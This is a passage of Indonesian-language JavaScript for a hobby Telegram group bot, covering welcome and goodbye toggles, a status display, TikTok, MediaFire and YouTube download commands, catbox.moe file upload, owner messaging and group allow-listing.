         return bot.sendMessage(chatId, "Рџа№ИЈ  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    welcomeEnabled = true;
    bot.sendMessage(chatId, "РюЁ Fitur selamat datang diaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});


bot.onText(/^\/welcomeoff$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
        return bot.sendMessage(chatId, "Рџа№ИЈ  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    welcomeEnabled = false;
    bot.sendMessage(chatId, "РюЁ Fitur selamat datang dinonaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.onText(/^\/goodbyeon$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
        return bot.sendMessage(chatId, "Рџа№ИЈ  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    goodbyeEnabled = true;
    bot.sendMessage(chatId, "РюЁ Fitur perpisahan diaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.onText(/^\/goodbyeoff$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
         return bot.sendMessage(chatId, "Рџа№ИЈ  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    goodbyeEnabled = false;
    bot.sendMessage(chatId, "РюЁ Fitur perpisahan dinonaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.on('new_chat_members', async (msg) => {
    const chatId = msg.chat.id;
    if (!welcomeEnabled) return; 

    const newMembers = msg.new_chat_members;
    if (!newMembers || newMembers.length === 0) return;

    
    const customWelcomeMessage = welcomeMessages[chatId] || "Selamat datang di grup!"; 
    newMembers.forEach(async (member) => {
        const userId = member.id;
        const username = member.username ? `@${member.username}` : member.first_name;
        const welcomeText = customWelcomeMessage.replace('{username}', username); 

        try {
            bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" }); 
        } catch (error) {
            console.error("Error mengirim pesan selamat datang:", error);
        }
    });
});

bot.on('left_chat_member', async (msg) => {
    
    const chatId = msg.chat.id;
    if (!goodbyeEnabled) {
        return;  
    }
    const member = msg.left_chat_member;
    if (!member) {  
       console.warn("Peringatan:  Tidak ada informasi anggota yang keluar."); 
        return;
    }
    await sendGoodbyeMessage(chatId, member);
});
let botStartTime = new Date();
function getRuntime() {
  const now = new Date();
  const diffInSeconds = Math.floor((now - botStartTime) / 1000);
  const days = Math.floor(diffInSeconds / (3600 * 24));
  const hours = Math.floor((diffInSeconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((diffInSeconds % 3600) / 60);
  const seconds = diffInSeconds % 60;
  return `${days} hari, ${hours} jam, ${minutes} menit, ${seconds} detik`;
}


function getWIBTime() {
    const now = new Date();

    
    const wibTime = now.toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta', 
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false 
    });
    return wibTime;
}

bot.onText(/\/status/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const welcomeMessage = welcomeMessages[chatId] || "Belum diatur";
    const goodbyeMessage = goodbyeMessages[chatId] || "Belum diatur"; // (BARU)
    const aiStatusText = aiEnabled ? "РюЁ Aktif" : "РЮї Tidak Aktif";
    const welcomeStatus = welcomeEnabled ? "РюЁ Aktif" : "РЮї Tidak Aktif";
    const goodbyeStatus = goodbyeEnabled ? "РюЁ Aktif" : "РЮї Tidak Aktif"; // (BARU)
if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    const statusText = `
РЋГРћЂРћЂсђї ╔ф╔┤мЊр┤Ј╩ђр┤Їр┤ђs╔ф ╩Ўр┤Јр┤Џ сђЇРћЂРћЂРћЂРгБ
     ­Ъїђ sр┤Џр┤ђр┤Џр┤юs р┤Јр┤Џр┤ђx :
­Ъїђ р┤ђ╔ф: ${aiStatusText}
­Ъїђ мЊ╔фр┤Џр┤ю╩ђ sр┤Є╩Ър┤ђр┤Їр┤ђр┤Џ р┤Ёр┤ђр┤Џр┤ђ╔┤╔б: ${welcomeStatus}
­Ъїђ мЊ╔фр┤Џр┤ю╩ђ ╔бр┤Јр┤Јр┤Ё╩Ў╩Јр┤Є: ${goodbyeStatus} 
­Ъїђ р┤ўр┤Єsр┤ђ╔┤ sр┤Є╩Ър┤ђр┤Їр┤ђр┤Џ р┤Ёр┤ђр┤Џр┤ђ╔┤╔б : ${welcomeMessage.substring(0, 20)}...
­Ъїђ р┤ўр┤Єsр┤ђ╔┤ ╔бр┤Јр┤Јр┤Ё╩Ў╩Јр┤Є : ${goodbyeMessage.substring(0, 20)}...
­Ъїђ р┤Ар┤ђр┤Ір┤Џр┤ю р┤Їр┤ю╩Ър┤ђ╔ф (р┤А╔ф╩Ў): ${botStartTime ? botStartTime.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : 'Tidak Diketahui'} (WIB) 
­Ъїђ р┤Ар┤ђр┤Ір┤Џр┤ю sр┤Єр┤Ір┤ђ╩ђр┤ђ╔┤╔б (р┤А╔ф╩Ў): ${getWIBTime()}
­Ъїђ р┤Ар┤ђр┤Ір┤Џр┤ю р┤ђр┤Ір┤Џ╔фмЊ: ${getRuntime()}
РЋ░РћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРћђРгБ
­ЮўЙ­ЮЎД­ЮЎџ­ЮЎќ­ЮЎЕ­ЮЎџ­ЮЎЎ ­Юўй­ЮЎ« ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ ├Ќ═ю├Ќ
  `;
    bot.sendMessage(chatId, statusText, { parse_mode: "Markdown" });
});
// scrape command by otax
async function fetchJson(url, options) {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}
bot.onText(/^(\/tt)\s+(.*)/i, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const text = match[2]; 
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (!text) {
            return bot.sendMessage(chatId, 'Mohon berikan URL tiktok!', { reply_to_message_id: msg.message_id });
        }
        if (!text.includes('tiktok.com')) {
            return bot.sendMessage(chatId, 'Harus berupa link tiktok!', { reply_to_message_id: msg.message_id });
        }
       
        
        try {
            const jir = await fetchJson(`https://vapis.my.id/api/ttdl?url=${text}`);

            if (jir.status && jir.data) {
                const nowmVideo = jir.data.data.find(item => item.type === 'nowatermark');
                if (nowmVideo) {
                    
                    const videoUrl = nowmVideo.url;
                    const videoResponse = await axios({
                        method: 'GET',
                        url: videoUrl,
                        responseType: 'stream', 
                    });

                    
                    const filename = `/tmp/tiktok_${Date.now()}.mp4`; 
                    const writer = fs.createWriteStream(filename);
                    videoResponse.data.pipe(writer);

                    await new Promise((resolve, reject) => {
                        writer.on('finish', resolve);
                        writer.on('error', reject);
                    });

                    
                    try {
                        await bot.sendVideo(chatId, fs.createReadStream(filename), {
                            caption: `┬Е р┤Јр┤Џр┤ђx мЊр┤Ј╩ђ ╩Јр┤Јр┤ю`,
                            reply_to_message_id: msg.message_id,
                        });
                        console.log(`Berhasil mengirim video TikTok ke ${chatId}`);
                    } catch (sendError) {
                        console.error('Kesalahan saat mengirim video:', sendError);
                        return bot.sendMessage(chatId, 'Gagal mengirim video. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
                    } finally {
                        
                        try {
                            fs.unlinkSync(filename);
                            console.log(`Berkas video TikTok dihapus: ${filename}`);
                        } catch (unlinkError) {
                            console.error('Kesalahan saat menghapus berkas video:', unlinkError);
                        }
                    }
                }
            }
        } catch (err1) {
            console.error('Kesalahan dari API vapis.my.id:', err1); 
           
            try {
                const anu = await fetchJson(`https://api.vreden.web.id/api/tiktok?url=${text}`);

                if (anu && anu.result && anu.result.data) {
                    const data = anu.result.data;
                    if (data.length === 0) {
                        return bot.sendMessage(chatId, 'Tidak ada video/foto yang ditemukan.', { reply_to_message_id: msg.message_id });
                    }

                    const imgs = data[0]; 
                    if (imgs.type === 'nowatermark') {
                        
                        const videoUrl = imgs.url;
                        const videoResponse = await axios({
                            method: 'GET',
                            url: videoUrl,
                            responseType: 'stream', 
                        });

                        
                        const filename = `/tmp/tiktok_${Date.now()}.mp4`; 
                        const writer = fs.createWriteStream(filename);
                        videoResponse.data.pipe(writer);

                        await new Promise((resolve, reject) => {
                            writer.on('finish', resolve);
                            writer.on('error', reject);
                        });

                        
                        try {
                            await bot.sendVideo(chatId, fs.createReadStream(filename), {
                                caption: `р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`,
                                reply_to_message_id: msg.message_id,
                            });
                            console.log(`Berhasil mengirim video TikTok ke ${chatId}`);
                        } catch (sendError) {
                            console.error('Kesalahan saat mengirim video:', sendError);
                            return bot.sendMessage(chatId, 'Gagal mengirim video. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
                        } finally {
                           
                            try {
                                fs.unlinkSync(filename);
                                console.log(`Berkas video TikTok dihapus: ${filename}`);
                            } catch (unlinkError) {
                                console.error('Kesalahan saat menghapus berkas video:', unlinkError);
                            }
                        }
                    } else if (imgs.type === 'photo') {
                         return bot.sendPhoto(chatId, imgs.url, {
                            caption: `┬Е р┤Јр┤Џр┤ђx мЊр┤Ј╩ђ ╩Јр┤Јр┤ю\n\n${m.isGroup ? 'Sisa foto dikirim di private chat' : ''}`,
                            reply_to_message_id: msg.message_id
                        });
                    }
                }
            } catch (err2) {
                console.error('Kesalahan dari API api.vreden.web.id:', err2); 
                return bot.sendMessage(chatId, 'Gagal mengunduh video. Coba lagi nanti atau periksa URL.', { reply_to_message_id: msg.message_id });
            }
        }

    } catch (err) {
        console.error('Terjadi kesalahan secara keseluruhan: ', err); 
        return bot.sendMessage(chatId, 'Terjadi kesalahan secara keseluruhan saat memproses permintaan.', { reply_to_message_id: msg.message_id }); 
    }
});
bot.onText(/^(\/mediafire)\s+(.*)/i, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const text = match[2]; // Dapatkan URL MediaFire dari grup penangkapan kedua
    if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (!text) {
            return bot.sendMessage(chatId, 'Mohon berikan link mediafire!', { reply_to_message_id: msg.message_id });
        }
        if (!text.includes('mediafire.com')) {
            return bot.sendMessage(chatId, 'Harus berupa link mediafire!', { reply_to_message_id: msg.message_id });
        }

        
        try {
            const api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${text}`);
       
            if (!api || !api.result || !api.result[0]) {
                return bot.sendMessage(chatId, 'Gagal mendapatkan informasi berkas dari MediaFire.', { reply_to_message_id: msg.message_id });
            }

            const data = api.result[0];

            const fileNama = decodeURIComponent(data.nama || 'file.zip');
            const extension = fileNama.split('.').pop().toLowerCase();
            let tempFilePath = ''; 

            try {
                const res = await axios.get(data.link, {
                    responseType: 'arraybuffer',
                });
                const media = Buffer.from(res.data);
                // Simpan file ke temporary file
                tempFilePath = `/tmp/${Date.now()}.${extension}`;
                fs.writeFileSync(tempFilePath, media);

                let mimetype = '';
                if (extension === 'mp4') {
                    mimetype = 'video/mp4';
                } else if (extension === 'mp3') {
                    mimetype = 'audio/mp3';
                } else {
                    mimetype = `application/${extension}`;
                }

                await bot.sendDocument(chatId, fs.createReadStream(tempFilePath), { 
                    filename: fileNama,
                    mimetype: mimetype,
                    reply_to_message_id: msg.message_id,
                });
            } catch (axiosError) {
                console.error('Kesalahan saat mengunduh atau mengirim berkas:', axiosError);
                return bot.sendMessage(chatId, 'Gagal mengunduh atau mengirim berkas. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
            } finally { 
                if (tempFilePath) {
                  try {
                    fs.unlinkSync(tempFilePath);
                    console.log(`Berhasil menghapus berkas temporary: ${tempFilePath}`);
                  } catch (unlinkError) {
                    console.error('Kesalahan saat menghapus berkas temporary:', unlinkError);
                  }
                }
            }
        } catch (apiError) {
            console.error('Kesalahan saat memanggil API:', apiError);
            return bot.sendMessage(chatId, 'Gagal mendapatkan informasi berkas. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
        }

    } catch (err) {
        console.error('Terjadi kesalahan secara keseluruhan: ', err);
        return bot.sendMessage(chatId, 'Terjadi kesalahan secara keseluruhan saat memproses permintaan.', { reply_to_message_id: msg.message_id });
    }
});
const ytdl = require("@lyrra-evanth/src-yt"); 
const { ytdlv2 } = require('@leoo-vanth/zarv-vz');
bot.onText(/^(\/play)\s+(.*)/i, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const text = match[2]; 
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}  if (!text) {
            return bot.sendMessage(chatId, '*Masukkan Judul Lagu!*\n\nContoh:\n/play My Little Dark Age', { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
        }

        const search = await ytdl.search(text);
        const data = search.results.filter(objek => objek.type === "video");
        const convert = data[0];

        if (!convert) {
            return bot.sendMessage(chatId, 'Audio tidak ditemukan!', { reply_to_message_id: msg.message_id });
        }
        
        await bot.sendChatAction(chatId, 'typing');

        const response = await ytdlv2(convert.url, 'mp3', 128); 
        const downloadPath = response.download;

        if (!fs.existsSync(downloadPath)) {
            return bot.sendMessage(chatId, 'Gagal mengunduh audio!', { reply_to_message_id: msg.message_id });
        }    
       
        try {
            const resThumb = await axios.get(convert.thumbnail, { responseType: 'arraybuffer' });
            const thumbs = Buffer.from(resThumb.data);

            
            await bot.sendAudio(chatId, fs.createReadStream(downloadPath), {
                title: convert.title,
                performer: convert.author.name,
                reply_to_message_id: msg.message_id,
                
                caption: `РюЁ Berhasil mengunduh:\nJudul: ${convert.title}\nArtis: ${convert.author.name}\n
                р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`,
            });
          
        } catch (thumbError) {
            console.error('Gagal mendapatkan thumbnail:', thumbError);
            
            await bot.sendAudio(chatId, fs.createReadStream(downloadPath), {
                title: convert.title,
                performer: convert.author.name,
                reply_to_message_id: msg.message_id,
                caption: `РюЁ Berhasil mengunduh:\nJudul: ${convert.title}\nArtis: ${convert.author.name}\n(Tidak dapat mengambil thumbnail)\n
                р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`,
            });
            
        }
        try {
            fs.unlinkSync(downloadPath);
        } catch (unlinkError) {
            bot.sendMessage('Gagal menghapus berkas audio:', unlinkError);
        }

    } catch (err) {
        return bot.sendMessage(chatId, 'Terjadi kesalahan: ' + err.message, { reply_to_message_id: msg.message_id });
    }
});

async function CatBox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', '');
    data.append('fileToUpload', fs.createReadStream(path));

    
    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(), 
        data: data
    };
    const api = await axios.request(config);
    return api.data;
}


function getFileExtension(contentType) {
    if (!contentType) {
        return '.bin'; 
    }
    if (contentType.includes('image/jpeg') || contentType.includes('image/jpg')) {
        return '.jpg';
    } else if (contentType.includes('image/png')) {
        return '.png';
    } else if (contentType.includes('image/gif')) {
        return '.gif';
    } else if (contentType.includes('video/mp4')) {
        return '.mp4';
    } else if (contentType.includes('video/quicktime')) {
        return '.mov'; 
    } else if (contentType.includes('audio/mpeg')) {
        return '.mp3';
    } else if (contentType.includes('audio/ogg')) {
        return '.ogg';
    } else if (contentType.includes('application/pdf')) {
        return '.pdf';
    } else if (contentType.includes('application/zip')) {
        return '.zip';
    } else {
        return '.bin'; 
    }
}


// Handler perintah /tourl
bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const message = msg;
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (message.reply_to_message) {
            const repliedMessage = message.reply_to_message;
            let fileId;
            let contentType; 

            if (repliedMessage.photo) {
                fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
                contentType = 'image/jpeg';  
            } else if (repliedMessage.video) {
                fileId = repliedMessage.video.file_id;
                contentType = 'video/mp4'; 
            } else if (repliedMessage.document) {
                fileId = repliedMessage.document.file_id;
                contentType = repliedMessage.document.mime_type; 
            } else if (repliedMessage.audio) {
                fileId = repliedMessage.audio.file_id;
                contentType = repliedMessage.audio.mime_type; 
            } else {
                return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
            }

            
            const fileInfo = await bot.getFile(fileId);
            const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
            const response = await axios.get(fileLink, { responseType: 'stream' });

            
            const fileExtension = getFileExtension(contentType);
            
            const filePath = `./temp_${Date.now()}${fileExtension}`;

            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);

            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

            
            const catBoxUrl = await CatBox(filePath);
            const result = `­ЪЊд *CatBox*: ${catBoxUrl || '-'}\n
            р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`;
            bot.sendMessage(chatId, result, { parse_mode: 'Markdown', reply_to_message_id: repliedMessage.message_id });

            
            fs.unlinkSync(filePath);

        } else {
            return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
        }

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses file.');
    }
});
bot.onText(/\/owner (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const message = match[1]; 
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const OTAX_ID = `${OWNER_ID}`
    const firstName = msg.from.first_name;
    const lastName = msg.from.last_name || ''; 
    const username = msg.from.username || 'Tidak ada username'; 
    const senderName = `${firstName} ${lastName}`.trim(); 

    
    if (!message) {
        bot.sendMessage(chatId, 'Silakan masukkan pesan setelah /owner.');
        return;
    }

    try {
        const ownerMessage = `Pesan dari pengguna:\n` +
                             `Nama: \`${senderName}\` (@${username})\n` +
                             `ID: \`${userId}\`\n` +
                             `Chat ID: \`${chatId}\`\n` +
                             `Pesan: ${message}\n
                             р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`;

        bot.sendMessage(OTAX_ID, ownerMessage, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, 'Sabar Wahai BosKuh, Pesan Anda Telah Dikirim Ke Owner Bot\n р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ.');
    } catch (error) {
        console.error('Gagal mengirim pesan ke owner:', error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat mengirim pesan ke owner.');
    }
});
async function getUserInfo(userId) {
    try {
        const user = await bot.getChat(userId); 
        if (user) {
            const username = user.username || 'Tidak ada username';
            const firstName = user.first_name || 'Tidak ada nama depan';
            const lastName = user.last_name || 'Tidak ada nama belakang';
            const fullName = `${firstName} ${lastName}`.trim(); 

            return {
                id: userId,
                username: username,
                firstName: firstName,
                lastName: lastName,
                fullName: fullName,
            };
        } else {
            return null; 
        }
    } catch (error) {
        console.error('Gagal mendapatkan informasi pengguna:', error);
        return null; 
    }
}

// Handler untuk command /cek
bot.onText(/\/cek (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userIdToCek = parseInt(match[1], 10); 
if (shouldIgnoreMessage(msg)) return;
    if (isNaN(userIdToCek)) {
        bot.sendMessage(chatId, 'Format perintah salah. Gunakan /cek [ID Pengguna Telegram].');
        return;
    }

    const userInfo = await getUserInfo(userIdToCek);

    if (userInfo) {
        const { id, username, firstName, lastName, fullName } = userInfo;

        const message = `
­ЪЉц Informasi Pengguna:

  ID: ${id}
  Username: @${username}
  Nama Lengkap: ${fullName}
  р┤ё╩ђр┤Єр┤ђр┤Џр┤Є ╩Ў╩Ј р┤Јр┤Џр┤ђxРИЎ`;
        bot.sendMessage(chatId, message); 
    } else {
        bot.sendMessage(chatId, 'Pengguna tidak ditemukan atau informasi tidak dapat diakses.');
    }
});
bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
    { parse_mode: "Markdown" }
  );
}

        addGroupToAllowed(chatId); 
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});


bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); 
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});



bot.on("polling_error", async (err) => {
    await logErrorToFile(err, 'Polling Error', 'Kesalahan Polling Telegram');
    console.log(err);
});

